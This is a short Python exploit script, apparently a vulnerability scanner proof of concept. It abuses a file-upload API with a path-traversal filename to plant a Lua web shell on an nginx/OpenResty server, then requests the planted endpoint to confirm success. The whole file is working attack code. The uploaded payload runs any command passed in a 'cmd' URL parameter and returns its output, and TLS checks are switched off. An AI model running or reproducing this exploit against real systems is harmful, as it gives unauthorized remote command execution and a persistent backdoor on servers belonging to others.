#-*-coding:utf-8-*-
import requests,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
  import random
  key=random.randint(int(s),int(e))
  return key
r2=randomInt(10000, 99999)
def randomLowercase(n):
  key=""
  zf="qwertyuiopasdfghjklzxcvbnm"
  import random
  for _ in range(n):
    suiji1=random.randint(0,len(zf)-1)
    key+=zf[suiji1]
  return key
rand=randomLowercase(10)
def scan(baseurl):
    url = baseurl+ f'api/client_upload_file.json?mid=202cb962ac59075b964b07152d234b10&md5=88aca4dfc84d8abd8c2b01a572d60339&filename=../../lua/{r2}.LUAC'
    headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15(KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHThfk91oxQ',
    'Accept-Encoding': 'gzip',
    }
    body='''------WebKitFormBoundaryLx7ATxHThfk91oxQ\r
Content-Disposition: form-data; name="file"; filename="'''+rand+'''.php"\r
Content-Type: application/xxxx\r
\r
if ngx.req.get_uri_args().cmd then\r
cmd = ngx.req.get_uri_args().cmd\r
local t = io.popen(cmd)\r
local a = t:read("*all")\r
ngx.say(a)\r
end\r
------WebKitFormBoundaryLx7ATxHThfk91oxQ--'''
    req = requests.post(url,body,headers=headers,timeout=20, verify=False)
    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"}
    res=requests.get(baseurl+f'api/{r2}.json',headers=headers,timeout=20, verify=False)
    if req.status_code==200 and '"status":true' in req.text:
      return True
    else:
      return False

